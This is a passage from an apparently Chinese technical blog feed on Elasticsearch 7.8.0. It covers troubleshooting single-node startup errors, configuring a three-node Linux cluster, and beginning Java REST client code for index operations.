/]# cd /opt/es/</span><br><span class="line">[root@nanzx es]# su es</span><br><span class="line">[es@nanzx es]$ bin/elasticsearch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台启动</span></span><br><span class="line">[es@nanzx es]$ bin/elasticsearch -d</span><br></pre></td></tr></table></figure><h2 id="启动异常问题"><a href="#启动异常问题" class="headerlink" title="启动异常问题"></a>启动异常问题</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx es]# bin/elasticsearch</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.RuntimeException: starting java failed with [1]</span><br><span class="line">output:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># There is insufficient memory for the Java Runtime Environment to continue.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Native memory allocation (mmap) failed to map 1073741824 bytes <span class="keyword">for</span> committing reserved memory.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">An error report file with more information is saved as:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">logs/hs_err_pid95986.<span class="built_in">log</span></span></span><br><span class="line">error:</span><br><span class="line">OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000c0000000, 1073741824, 0) failed; error=&#x27;Not enough space&#x27; (errno=12)</span><br><span class="line">at org.elasticsearch.tools.launchers.JvmErgonomics.flagsFinal(JvmErgonomics.java:126)</span><br><span class="line">at org.elasticsearch.tools.launchers.JvmErgonomics.finalJvmOptions(JvmErgonomics.java:88)</span><br><span class="line">at org.elasticsearch.tools.launchers.JvmErgonomics.choose(JvmErgonomics.java:59)</span><br><span class="line">at org.elasticsearch.tools.launchers.JvmOptionsParser.jvmOptions(JvmOptionsParser.java:137)</span><br><span class="line">at org.elasticsearch.tools.launchers.JvmOptionsParser.main(JvmOptionsParser.java:95)</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><ol><li><p>执行命令<code>free -m</code>查看内存，最主要的是看有没有交换空间 swap，如果没有交换空间或者交换空间比较小，要先安装交换空间或者增大空间</p></li><li><p>创建swapfile：<code>dd if=/dev/zero of=swapfile bs=1024 count=500000</code></p></li><li><p>将swapfile设置为swap空间（把这个文件变成swap文件）：  <code>mkswap swapfile</code></p></li><li><p>启用交换空间（启用这个swap文件）：<code>swapon swapfile</code> （删除交换空间是<code>swapoff swapfile</code>）</p></li><li><p>执行命令<code>free -m</code>查看swap空间大小是否发生变化</p></li></ol><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx es]# bin/elasticsearch</span><br><span class="line">[2021-11-21T13:25:57,949][ERROR][o.e.b.ElasticsearchUncaughtExceptionHandler] [node-1] uncaught exception in thread [main]</span><br><span class="line">org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root</span><br><span class="line">at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:174) ~[elasticsearch-7.8.0.jar:7.8.0]</span><br><span class="line">at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:161) ~[elasticsearch-7.8.0.jar:7.8.0]</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><ol><li>切换为elasticsearch文件夹所有者登录（参考第二步创建的用户）：<code>su es</code></li></ol><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[es@nanzx es]$ bin/elasticsearch</span><br><span class="line">could not find java in bundled jdk at /root/software/es/jdk/bin/java</span><br><span class="line">[es@nanzx es]$ java -version</span><br><span class="line">bash: java: 未找到命令</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><ol><li>查看本机是否安装了java环境<code>java -version</code></li><li>如果root用户显示jdk环境变量正常，而es用户显示不正常，则需要将jdk转移到一个非root目录</li><li><a href="https://nanzx.top/posts/59553/">Centos7安装配置java环境</a></li></ol><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[es@nanzx es]$ bin/elasticsearch</span><br><span class="line">错误: 找不到或无法加载主类 org.elasticsearch.tools.java_version_checker.JavaVersionChecker</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><ol><li>说明 es 没有此目录的权限，需要把Elasticsearch文件夹复制到非root目录里，建议软件不要直接安装在root目录下</li></ol><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[es@nanzx es]$ bin/elasticsearch</span><br><span class="line">future versions of Elasticsearch will require Java 11; your Java version from [/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64/jre] does not meet this requirement</span><br><span class="line">future versions of Elasticsearch will require Java 11; your Java version from [/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64/jre] does not meet this requirement</span><br><span class="line">OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N</span><br><span class="line">已杀死</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><p>启动过程中被自动killed是因为内存不够了，由于ES是运行在JVM上，JVM本身除了分配的heap内存以外，还会用到一些堆外(off heap)内存。 在小内存的机器上跑ES，如果heap划分过多，累加上堆外内存后，总的JVM使用内存量可能超过物理内存限制。 如果swap又是关闭的情况下，就会被操作系统oom killer杀掉。</p><p>我的虚拟机只有1G运行内存，而es中的jvm配置文件中就配置了1g的堆大小，导致没有足够空间分配，故es启动不起来。</p><p>修改配置文件：<code>vi config/jvm.options</code>，将<code>-Xmx1g</code>改为<code>-Xmx512m</code>，重新启动即可。</p><h2 id="测试是否启动成功"><a href="#测试是否启动成功" class="headerlink" title="测试是否启动成功"></a>测试是否启动成功</h2><p>新建一个窗口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# curl -XGET &#x27;localhost:9200&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot; : &quot;node-1&quot;,</span><br><span class="line">  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,</span><br><span class="line">  &quot;cluster_uuid&quot; : &quot;93G_jmzxT8qKl8NI2Kyh0A&quot;,</span><br><span class="line">  &quot;version&quot; : &#123;</span><br><span class="line">    &quot;number&quot; : &quot;7.8.0&quot;,</span><br><span class="line">    &quot;build_flavor&quot; : &quot;default&quot;,</span><br><span class="line">    &quot;build_type&quot; : &quot;tar&quot;,</span><br><span class="line">    &quot;build_hash&quot; : &quot;757314695644ea9a1dc2fecd26d1a43856725e65&quot;,</span><br><span class="line">    &quot;build_date&quot; : &quot;2020-06-14T19:35:50.234439Z&quot;,</span><br><span class="line">    &quot;build_snapshot&quot; : false,</span><br><span class="line">    &quot;lucene_version&quot; : &quot;8.5.1&quot;,</span><br><span class="line">    &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;,</span><br><span class="line">    &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;tagline&quot; : &quot;You Know, for Search&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Linux集群"><a href="#Linux集群" class="headerlink" title="Linux集群"></a>Linux集群</h1><h2 id="下载解压-1"><a href="#下载解压-1" class="headerlink" title="下载解压"></a>下载解压</h2><p>软件下载地址：<a href="https://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-8-0">https://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-8-0</a> </p><p>将下载好的安装包通过 Xftp 工具上传到 三台Linux服务器上</p><p>将下载的软件解压缩并重命名：</p><ul><li><p><code>tar -zxvf elasticsearch-7.8.0-linux-x86_64.tar.gz -C /opt/</code></p></li><li><p><code>cd /opt/module </code> </p></li><li><p><code>mv elasticsearch-7.8.0 es-cluster</code></p></li></ul><h2 id="创建用户-1"><a href="#创建用户-1" class="headerlink" title="创建用户"></a>创建用户</h2><p>因为安全问题，Elasticsearch 不允许 root 用户直接运行，所以要创建新用户，在 root 用户中创建新用户：</p><ol><li>新增 es 用户：<code>useradd es</code></li><li>为 es 用户设置密码：<code>passwd es</code></li><li>如果新增错了，可以删除再加：<code>userdel -r es</code></li><li>改变文件夹所有者和群组：<code>chown -R es:es /opt/es-cluster</code></li><li>查看文件夹所有者和群组是否更改成功：<code>ls -ll</code></li></ol><h2 id="修改配置文件-1"><a href="#修改配置文件-1" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>修改 &#x2F;opt&#x2F;es-cluster&#x2F;config&#x2F;elasticsearch.yml  文件，加入如下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#集群名称</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">cluster-es</span></span><br><span class="line"><span class="comment">#节点名称，每个节点的名称不能重复</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1</span></span><br><span class="line"><span class="comment">#ip 地址，每个节点的地址不能重复</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.110</span></span><br><span class="line"><span class="comment">#是不是有资格主节点</span></span><br><span class="line"><span class="attr">node.master:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">node.data:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9200</span></span><br><span class="line"><span class="comment"># head 插件需要这打开这两个配置，跨域配置</span></span><br><span class="line"><span class="attr">http.cors.allow-origin:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line"><span class="attr">http.cors.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">http.max_content_length:</span> <span class="string">200mb</span></span><br><span class="line"><span class="comment">#es7.x 之后新增的配置，初始化一个新的集群时需要此配置来选举 master</span></span><br><span class="line"><span class="attr">cluster.initial_master_nodes:</span> [<span class="string">&quot;node-1&quot;</span>]</span><br><span class="line"><span class="comment">#es7.x 之后新增的配置，节点发现</span></span><br><span class="line"><span class="attr">discovery.seed_hosts:</span> [<span class="string">&quot;192.168.2.110:9300&quot;</span>,<span class="string">&quot;192.168.2.112:9300&quot;</span>,<span class="string">&quot;192.168.2.113:9300&quot;</span>]</span><br><span class="line"><span class="attr">gateway.recover_after_nodes:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">network.tcp.keep_alive:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">network.tcp.no_delay:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport.tcp.compress:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#集群内同时启动的数据任务个数，默认是 2 个</span></span><br><span class="line"><span class="attr">cluster.routing.allocation.cluster_concurrent_rebalance:</span> <span class="number">16</span></span><br><span class="line"><span class="comment">#添加或删除节点及负载均衡时并发恢复的线程个数，默认 4 个</span></span><br><span class="line"><span class="attr">cluster.routing.allocation.node_concurrent_recoveries:</span> <span class="number">16</span></span><br><span class="line"><span class="comment">#初始化数据恢复时，并发恢复线程的个数，默认 4 个</span></span><br><span class="line"><span class="attr">cluster.routing.allocation.node_initial_primaries_recoveries:</span> <span class="number">16</span></span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件，在文件末尾中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个进程可以打开的文件数的限制</span></span><br><span class="line"><span class="string">es</span> <span class="string">soft</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="string">es</span> <span class="string">hard</span> <span class="string">nofile</span> <span class="number">65536</span></span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;20-nproc.conf 文件，在文件末尾中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个进程可以打开的文件数的限制</span></span><br><span class="line"><span class="string">es</span> <span class="string">soft</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="string">es</span> <span class="string">hard</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="comment"># 操作系统级别对每个用户创建的进程数的限制</span></span><br><span class="line"><span class="string">*</span> <span class="string">hard</span> <span class="string">nproc</span> <span class="number">4096</span></span><br><span class="line"><span class="comment"># 注：* 代表 Linux 所有用户名称</span></span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;sysctl.conf 文件，在文件中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个进程可以拥有的 VMA(虚拟内存区域)的数量,默认值为 65536</span></span><br><span class="line"><span class="string">vm.max_map_count=655360</span></span><br></pre></td></tr></table></figure><p><strong>重新加载：</strong><code>sysctl -p </code></p><h2 id="启动服务-1"><a href="#启动服务-1" class="headerlink" title="启动服务"></a>启动服务</h2><p>分别在不同节点上启动 ES 软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx /]# cd /opt/es-cluster/</span><br><span class="line">[root@nanzx es]# su es</span><br><span class="line">[es@nanzx es]$ bin/elasticsearch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台启动</span></span><br><span class="line">[es@nanzx es]$ bin/elasticsearch -d</span><br></pre></td></tr></table></figure><h2 id="测试集群"><a href="#测试集群" class="headerlink" title="测试集群"></a>测试集群</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# curl -XGET &#x27;localhost:9200/_cat/nodes&#x27;</span><br><span class="line">192.168.2.113 18 94 8 0.49 0.93 2.27 dilmrt - node-3</span><br><span class="line">192.168.2.112 18 94 0 0.10 0.97 2.37 dilmrt - node-2</span><br><span class="line">172.17.0.1 28 94 0 0.08 1.67 2.69 dilmrt * node-1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch的Java操作</title>
      <link href="/posts/15202/"/>
      <url>/posts/15202/</url>
      
        <content type="html"><![CDATA[<p>Elasticsearch 软件是由 Java 语言开发的，所以也可以通过 Java API 的方式对 Elasticsearch服务进行访问。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>pom文件导入相关依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.elasticsearch<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>elasticsearch<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- elasticsearch 的客户端 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.elasticsearch.client<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>elasticsearch-rest-high-level-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- elasticsearch 依赖 2.x 的 log4j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit 单元测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="客户端对象"><a href="#客户端对象" class="headerlink" title="客户端对象"></a>客户端对象</h1><p>因为早期版本的客户端对象<code>TransportClient</code>已经不再推荐使用，且在未来版本中会被删除，所以这里我们采用高级 REST 客户端对象<code>RestHighLevelClient</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EsTets</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建客户端对象</span></span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>,<span class="number">9200</span>,<span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭客户端连接</span></span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>9200 <strong>端口为 Elasticsearch 的 Web 通信端口，</strong>localhost</strong> 为启动 ES 服务的主机名。执行代码，查看控制台信息：</p><blockquote><p>23:37:27.621 [main] DEBUG org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager - Connection manager is shutting down<br>23:37:27.628 [main] DEBUG org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager - Connection manager shut down</p><p>Process finished with exit code 0</p></blockquote><p>说明启动成功。</p><hr><h1 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a>索引操作</h1><h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CreateIndex</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 创建索引 - 请求对象</span></span><br><span class="line">        <span class="type">CreateIndexRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CreateIndexRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 发送请求，获取响应</span></span><br><span class="line">        <span class="type">CreateIndexResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.indices().create(request, RequestOptions.DEFAULT);</span><br><span class="line">        <span class="comment">// 响应状态</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">acknowledged</span> <span class="operator">=</span> response.isAcknowledged();</span><br><span class="line">        System.out.println(<span class="string">&quot;操作状态 = &quot;</span> + acknowledged);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查询索引"><a href="#查询索引" class="headerlink" title="查询索引"></a>查询索引</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SearchIndex</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 查询索引</span></span><br><span class="line">        <span class="type">GetIndexRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetIndexRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 发送请求，获取响应</span></span><br><span class="line">        <span class="type">GetIndexResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.indices().get(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        System.out.println(response.getAliases());</span><br><span class="line">        System.out.println(response.getMappings());</span><br><span class="line">        System.out.println(response.getSettings());</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeleteIndex</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 